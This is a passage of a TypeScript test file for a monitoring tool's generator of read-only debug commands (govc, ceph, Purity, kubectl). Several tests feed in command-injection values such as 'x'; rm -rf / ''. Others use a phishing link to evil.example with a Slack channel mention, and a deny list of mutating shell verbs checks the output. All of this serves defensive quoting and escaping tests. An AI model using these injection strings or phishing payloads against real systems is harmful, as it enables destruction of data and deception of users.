       * The vcenter receiver's identity is OTel RESOURCE attributes, so a
       * grouped VMware alert carries `resource.vcenter.vm.name`, not the
       * bare key. Both spellings must resolve.
       */
      const prefixed: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: { "resource.vcenter.vm.name": "web-01" },
      });
      const bare: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: { "vcenter.vm.name": "web-01" },
      });

      expect(prefixed[0]).toBe("govc vm.info -r web-01");
      expect(prefixed).toContain("govc device.info -vm web-01");
      expect(bare).toEqual(prefixed);
    });

    test("VMware puts the VM before the host it runs on", () => {
      /*
       * A VM series also carries its parent host. The VM is the thing that
       * breached, so its command comes first; the host's follows.
       */
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: {
          "resource.vcenter.datacenter.name": "DC1",
          "resource.vcenter.cluster.name": "Compute-A",
          "resource.vcenter.host.name": "esx01.example.com",
          "resource.vcenter.vm.name": "web-01",
        },
      });

      expect(commands[0]).toBe("govc vm.info -r web-01");
      expect(commands).toContain("govc host.info esx01.example.com");
      expect(
        commands.indexOf("govc host.info esx01.example.com"),
      ).toBeGreaterThan(commands.indexOf("govc vm.info -r web-01"));
      expect(commands).toContain("govc cluster.usage Compute-A");
      expect(commands).toContain("govc ls -l /DC1/host/Compute-A");
      expect(commands).toContain("govc datacenter.info DC1");
    });

    test("VMware offers esxtop for a host, since ready time and ballooning live there", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: { "resource.vcenter.host.name": "esx01.example.com" },
      });

      expect(commands[0]).toBe("govc host.info esx01.example.com");
      expect(commands).toContain("esxtop");
    });

    test("VMware inspects a datastore by name", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.VMware,
          seriesLabels: { "resource.vcenter.datastore.name": "vsanDatastore" },
        }),
      ).toEqual(["govc datastore.info vsanDatastore"]);
    });

    test("VMware only lists a cluster's hosts when the datacenter is known", () => {
      /*
       * `/<dc>/host/<cluster>` needs the datacenter; without it govc would
       * apply its default datacenter and could list the wrong cluster on
       * a multi-DC vCenter, so the listing is withheld rather than guessed.
       */
      const withoutDc: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: { "resource.vcenter.cluster.name": "Compute-A" },
      });

      expect(withoutDc).toEqual(["govc cluster.usage Compute-A"]);
    });

    test("VMware addresses a resource pool by its inventory path", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.VMware,
          seriesLabels: {
            "resource.vcenter.resource_pool.inventory_path":
              "/DC1/host/Compute-A/Resources/prod",
          },
        }),
      ).toEqual(["govc pool.info /DC1/host/Compute-A/Resources/prod"]);
    });

    test("VMware quotes a VM name carrying spaces or shell metacharacters", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.VMware,
        seriesLabels: { "resource.vcenter.vm.name": "Web Server; rm -rf /" },
      });

      expect(commands[0]).toBe("govc vm.info -r 'Web Server; rm -rf /'");
    });

    test("a series naming only the vCenter still gets a first command", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.VMware,
          seriesLabels: { "resource.vmware.vcenter.name": "vcsa-prod" },
        }),
      ).toEqual(["govc about"]);
    });

    test("VMware emits nothing for labels it does not recognise", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.VMware,
          seriesLabels: { "service.name": "api" },
        }),
      ).toEqual([]);
    });

    test("Ceph always starts from health detail", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Ceph,
        seriesLabels: { ceph_daemon: "osd.12" },
      });

      expect(commands[0]).toBe("ceph health detail");
      expect(commands).toContain("ceph daemon osd.12 status");
    });
  });

  describe("storage arrays (Purity//FA CLI)", () => {
    test("a hardware component gets the open alerts first, then the component", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.StorageArray,
          seriesLabels: { component_name: "CT0.FAN0" },
        }),
      ).toEqual([
        "purealert list --filter \"state='open'\"",
        "purehw list CT0.FAN0",
      ]);
    });

    test("a host gets the volumes connected to it", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.StorageArray,
          seriesLabels: { host: "esx-01" },
        }),
      ).toEqual([
        "purealert list --filter \"state='open'\"",
        "purehost list --connect esx-01",
      ]);
    });

    test("a pod's replica link gets the replica link list", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.StorageArray,
          seriesLabels: { local_pod: "pod-a" },
        }),
      ).toEqual([
        "purealert list --filter \"state='open'\"",
        "purepod replica-link list",
      ]);
    });

    test("the open alerts command appears once however many objects the series names", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.StorageArray,
        seriesLabels: {
          component_name: "CH0.BAY3",
          host: "esx-01",
          local_pod: "pod-a",
        },
      });

      expect(
        commands.filter((command: string) => {
          return command === "purealert list --filter \"state='open'\"";
        }),
      ).toHaveLength(1);
      expect(commands).toHaveLength(4);
    });

    test.each([
      [{ name: "vol-db-01" }],
      [{ name: "fs-home" }],
      [{ summary: "Controller failed" }],
      [{ "resource.storage.array.name": "pure-prod-01" }],
    ])(
      "%j names no FlashArray-only object, so it gets no command",
      (seriesLabels: JSONObject) => {
        /*
         * `name` is a volume on a FlashArray and a file system or bucket
         * on a FlashBlade — a different CLI — and the labels cannot say
         * which.
         */
        expect(
          getCommandStrings({
            monitorType: MonitorType.StorageArray,
            seriesLabels: seriesLabels,
          }),
        ).toEqual([]);
      },
    );

    test("a hostile host name is quoted into an inert argument", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.StorageArray,
          seriesLabels: { host: "esx-01; rm -rf /" },
        }),
      ).toContain("purehost list --connect 'esx-01; rm -rf /'");
    });
  });

  /*
   * #9711: a Traces monitor grouped by a mobile app's install (Device
   * Stopped Reporting) - the CLI can list what the install sent last.
   */
  describe("a quiet install of a mobile app", () => {
    test("lists the install's last spans, newest first, read-only", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Traces,
          seriesLabels: {
            "resource.app.installation.id":
              "1b4e28ba-2fa1-11d2-883f-0016d3cca427",
          },
        }),
      ).toEqual([
        `oneuptime span list --query '{"attributes":{"resource.app.installation.id":"1b4e28ba-2fa1-11d2-883f-0016d3cca427"}}' --sort '{"startTime":"DESC"}' --limit 5 --fields startTime,name,attributes`,
      ]);
    });

    test("a hostile install id is quoted into an inert argument", () => {
      const [command] = getCommandStrings({
        monitorType: MonitorType.Traces,
        seriesLabels: { "resource.app.installation.id": "x'; rm -rf / '" },
      });

      expect(command).toContain(`'{"attributes":`);
      // The single quote is closed, escaped and reopened, never left open.
      expect(command).toContain(`x'\\''; rm -rf / '\\''`);
    });

    test("a Traces series that names no install has no command", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Traces,
          seriesLabels: { "http.route": "/checkout" },
        }),
      ).toEqual([]);
    });
  });

  /*
   * #9835: a Metrics monitor grouped by a managed device (Esper Device
   * Stopped Checking In) - the CLI can list what the device's connection
   * last read of it. #10008: its battery and its storage at each read,
   * which a device manager's Low Battery and Storage Nearly Full read.
   * #10098: and its Android security patch's age at each read, which a
   * device manager's Security Patch Out of Date reads; the series names the
   * device alone, whichever template it is of.
   */
  describe("a managed device that stopped checking in", () => {
    test("lists the device's last readings, newest first, read-only", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Metrics,
          seriesLabels: { "oneuptime.managed_device.name": "ESP-ID-AAAAW" },
        }),
      ).toEqual([
        `oneuptime metric list --query '{"name":"oneuptime.managed_device.check_in.age","attributes":{"oneuptime.managed_device.name":"ESP-ID-AAAAW"}}' --sort '{"time":"DESC"}' --limit 5 --fields time,value,attributes`,
        `oneuptime metric list --query '{"name":"oneuptime.managed_device.battery.level","attributes":{"oneuptime.managed_device.name":"ESP-ID-AAAAW"}}' --sort '{"time":"DESC"}' --limit 5 --fields time,value,attributes`,
        `oneuptime metric list --query '{"name":"oneuptime.managed_device.storage.used","attributes":{"oneuptime.managed_device.name":"ESP-ID-AAAAW"}}' --sort '{"time":"DESC"}' --limit 5 --fields time,value,attributes`,
        `oneuptime metric list --query '{"name":"oneuptime.managed_device.security_patch.age","attributes":{"oneuptime.managed_device.name":"ESP-ID-AAAAW"}}' --sort '{"time":"DESC"}' --limit 5 --fields time,value,attributes`,
      ]);
    });

    test("its check-ins come first, its battery and storage next, the security patch's age last", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Metrics,
        seriesLabels: { "oneuptime.managed_device.name": "ESP-ID-AAAAW" },
      });

      expect(commands).toHaveLength(4);
      expect(commands[0]).toContain("oneuptime.managed_device.check_in.age");
      expect(commands[1]).toContain("oneuptime.managed_device.battery.level");
      expect(commands[2]).toContain("oneuptime.managed_device.storage.used");
      expect(commands[3]).toContain(
        "oneuptime.managed_device.security_patch.age",
      );
    });

    // #10006: the connection itself, when it stopped reading.
    test("a series that names a connection lists the connection's last reads, each with its error", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Metrics,
          seriesLabels: {
            "oneuptime.managed_device.connection.name": "Esper acme",
          },
        }),
      ).toEqual([
        `oneuptime metric list --query '{"name":"oneuptime.managed_device.connection.read.age","attributes":{"oneuptime.managed_device.connection.name":"Esper acme"}}' --sort '{"time":"DESC"}' --limit 5 --fields time,value,attributes`,
      ]);
    });

    test("finds the device under the resource. spelling too", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Metrics,
          seriesLabels: {
            "resource.oneuptime.managed_device.name": "ESP-ID-AAAAW",
          },
        })[0],
      ).toContain('"oneuptime.managed_device.name":"ESP-ID-AAAAW"');
    });

    test("a hostile device name is quoted into an inert argument", () => {
      const commands: Array<string> = getCommandStrings({
        monitorType: MonitorType.Metrics,
        seriesLabels: { "oneuptime.managed_device.name": "x'; rm -rf / '" },
      });

      expect(commands).toHaveLength(4);
      for (const command of commands) {
        expect(command).toContain(`'{"name":`);
        expect(command).toContain(`x'\\''; rm -rf / '\\''`);
      }
    });

    test("a Metrics series that names no managed device has no command", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Metrics,
          seriesLabels: { "service.instance.id": "api-1" },
        }),
      ).toEqual([]);
    });

    test("another monitor type grouped by a managed device has none either", () => {
      expect(
        getCommandStrings({
          monitorType: MonitorType.Logs,
          seriesLabels: { "oneuptime.managed_device.name": "ESP-ID-AAAAW" },
        }),
      ).toEqual([]);
    });
  });

  describe("types with no universally safe command", () => {
    test.each([
      MonitorType.Metrics,
      MonitorType.IoTDevice,
      MonitorType.Website,
      MonitorType.Logs,
      MonitorType.Traces,
    ])("%s emits no commands", (monitorType: MonitorType) => {
      expect(
        getCommandStrings({
          monitorType,
          seriesLabels: { "device.id": "sensor-1", "service.name": "api" },
        }),
      ).toEqual([]);
    });

    test("an undefined monitor type emits no commands", () => {
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: undefined,
          seriesLabels: KUBERNETES_POD_LABELS,
        }),
      ).toEqual([]);
    });

    test("an ungrouped monitor emits no commands", () => {
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: {},
        }),
      ).toEqual([]);
      expect(
        SeriesDebugHints.getDebugCommands({
          monitorType: MonitorType.Kubernetes,
          seriesLabels: undefined,
        }),
      ).toEqual([]);
    });
  });

  describe("every emitted command is read-only and complete", () => {
    const ALL_CASES: Array<{
      monitorType: MonitorType;
      seriesLabels: JSONObject;
    }> = [
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      },
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.namespace.name": "prod",
          "resource.k8s.deployment.name": "checkout",
          "resource.k8s.statefulset.name": "kafka",
          "resource.k8s.daemonset.name": "fluentd",
          "resource.k8s.job.name": "nightly",
          "resource.k8s.hpa.name": "web-hpa",
          "resource.k8s.node.name": "ip-10-0-3-14",
        },
      },
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          "resource.k8s.namespace.name": "prod",
          "resource.k8s.persistentvolumeclaim.name": "data-postgres-0",
        },
      },
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.namespace.name": "payments" },
      },
      {
        monitorType: MonitorType.Kubernetes,
        seriesLabels: { "resource.k8s.cluster.name": "prod-eu" },
      },
      {
        monitorType: MonitorType.Docker,
        seriesLabels: { "resource.container.name": "nginx" },
      },
      {
        monitorType: MonitorType.Podman,
        seriesLabels: { "resource.container.name": "nginx" },
      },
      {
        monitorType: MonitorType.DockerSwarm,
        seriesLabels: {
          "container.name": "web.1.abc",
          "docker.swarm.service.name": "web",
        },
      },
      {
        monitorType: MonitorType.Host,
        seriesLabels: {
          mountpoint: "/var",
          device: "/dev/sda1",
          "network.interface": "eth0",
        },
      },
      {
        monitorType: MonitorType.Proxmox,
        seriesLabels: { vmid: "100", node: "pve1", storage: "local-lvm" },
      },
      {
        monitorType: MonitorType.OpenStack,
        seriesLabels: {
          "openstack.region.name": "RegionOne",
          hostname: "compute-01",
          service: "nova-compute",
          uuid: "3f1c",
          router_id: "r-1",
          network_id: "n-1",
          id: "v-1",
          volume_type: "ssd",
          volume_backend_name: "lvm",
          tenant_id: "4f2d",
          status: "ERROR",
        },
      },
      {
        monitorType: MonitorType.OpenStack,
        seriesLabels: { openstack_service: "network" },
      },
      {
        monitorType: MonitorType.VMware,
        seriesLabels: {
          "resource.vmware.vcenter.name": "vcsa-prod",
          "resource.vcenter.datacenter.name": "DC1",
          "resource.vcenter.cluster.name": "Compute-A",
          "resource.vcenter.host.name": "esx01.example.com",
          "resource.vcenter.vm.name": "web-01",
          "resource.vcenter.vm_template.name": "ubuntu-24.04-template",
          "resource.vcenter.datastore.name": "vsanDatastore",
          "resource.vcenter.resource_pool.inventory_path":
            "/DC1/host/Compute-A/Resources/prod",
        },
      },
      {
        monitorType: MonitorType.Ceph,
        seriesLabels: { ceph_daemon: "osd.12", pool_id: "3" },
      },
      {
        monitorType: MonitorType.StorageArray,
        seriesLabels: {
          component_name: "CT0.FAN0",
          host: "esx-01",
          local_pod: "pod-a",
        },
      },
    ];

    /*
     * Verbs that change state. `rollout status` is read-only and must
     * not be caught by a bare "rollout" match, so the patterns are
     * deliberately specific.
     */
    const MUTATING_PATTERNS: Array<RegExp> = [
      /\bdelete\b/,
      /\bapply\b/,
      /\bpatch\b/,
      /\bedit\b/,
      /\bscale\b/,
      /\bdrain\b/,
      /\bcordon\b/,
      /\bevict\b/,
      /\bexec\b/,
      /\brollout (undo|restart|pause|resume)\b/,
      /\b(rm|kill|stop|start|restart|prune|reboot|shutdown)\b/,
      /\bset\b/,
      /*
       * A redirect that WRITES somewhere. `2>/dev/null` is how these
       * commands stay quiet about unreadable paths and is not a
       * mutation, so /dev/null is the one permitted target.
       */
      />\s*(?!\/dev\/null\b)\S/,
    ];

    test.each(ALL_CASES)(
      "$monitorType commands mutate nothing",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        const commands: Array<string> = getCommandStrings(testCase);

        expect(commands.length).toBeGreaterThan(0);

        for (const command of commands) {
          for (const pattern of MUTATING_PATTERNS) {
            expect(command).not.toMatch(pattern);
          }
        }
      },
    );

    test.each(ALL_CASES)(
      "$monitorType commands never contain a blank interpolation",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        for (const command of getCommandStrings(testCase)) {
          // A half-filled command shows up as a doubled or trailing space.
          expect(command).not.toMatch(/\s\s/);
          expect(command.trim()).toBe(command);
          // ...and as a flag with nothing after it.
          expect(command).not.toMatch(/(-n|-c)\s*$/);
        }
      },
    );

    test.each(ALL_CASES)(
      "$monitorType commands each explain what they answer",
      (testCase: { monitorType: MonitorType; seriesLabels: JSONObject }) => {
        for (const command of SeriesDebugHints.getDebugCommands(testCase)) {
          expect(command.purpose.length).toBeGreaterThan(0);
        }
      },
    );
  });

  describe("buildMarkdownBlock", () => {
    test("renders the commands as fenced markdown under a heading", () => {
      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
      });

      expect(block).toContain("**Start here**");
      expect(block).toContain("kubectl describe pod checkout-7d9f-2xk -n prod");
      expect(block).toContain("```");
    });

    test("caps how many commands land in a notification", () => {
      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: KUBERNETES_POD_LABELS,
        maxCommands: 2,
      });

      expect(block.split("- ").length - 1).toBe(2);
    });

    test("is empty when there is nothing to suggest", () => {
      expect(
        SeriesDebugHints.buildMarkdownBlock({
          monitorType: MonitorType.Metrics,
          seriesLabels: { "service.name": "api" },
        }),
      ).toBe("");
    });

    /*
     * A pod name is whatever the telemetry carried. A line break in it
     * would end the command's code block and spill the rest into the
     * description as Markdown; a Slack mention would reach Slack, which
     * passes code through untouched.
     */
    test("a value with line breaks, a fence and a mention stays inside its command's one code line", () => {
      const seriesLabels: JSONObject = {
        ...KUBERNETES_POD_LABELS,
        "resource.k8s.pod.name":
          "web-1\n```\n<!channel> [Verify](https://evil.example/login)\n",
      };

      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels,
      });

      const tokens: Array<Token> = [];
      marked.walkTokens(marked.lexer(block), (token: Token): void => {
        tokens.push(token);
      });

      const codeBlocks: Array<Tokens.Code> = tokens.filter(
        (token: Token): boolean => {
          return token.type === "code";
        },
      ) as Array<Tokens.Code>;

      // One code block per command, each a single line.
      expect(codeBlocks).toHaveLength(
        Math.min(
          SeriesDebugHints.getDebugCommands({
            monitorType: MonitorType.Kubernetes,
            seriesLabels,
          }).length,
          6,
        ),
      );
      for (const codeBlock of codeBlocks) {
        expect(codeBlock.text).not.toContain("\n");
      }

      // Nothing of the value reached the Markdown around the code.
      expect(
        tokens.filter((token: Token): boolean => {
          return token.type === "link" || token.type === "html";
        }),
      ).toEqual([]);
      expect(SlackUtil.convertMarkdownToSlackRichText(block)).not.toMatch(
        /<[!@#][A-Za-z0-9]/,
      );
    });

    /*
     * Slack also reads "<https://...|words>" in code as a link labelled
     * with the words. A value's link is broken by an invisible word joiner;
     * a "<" that starts no address - a heredoc, a redirect - is untouched.
     */
    test("a Slack link in a value is no link in its command, and the command reads as before", () => {
      const value: string = "<https://evil.example/login|Open the runbook>";

      const block: string = SeriesDebugHints.buildMarkdownBlock({
        monitorType: MonitorType.Kubernetes,
        seriesLabels: {
          ...KUBERNETES_POD_LABELS,
          "resource.k8s.pod.name": value,
        },
      });

      expect(block).toContain(`<${WORD_JOINER}https://evil.example/login|`);
      expect(block.split(WORD_JOINER).join("")).toContain(value);
      expect(SlackUtil.convertMarkdownToSlackRichText(block)).not.toMatch(
        /<https?:\/\/[^>|]*\|/,
      );
    });
  });
});
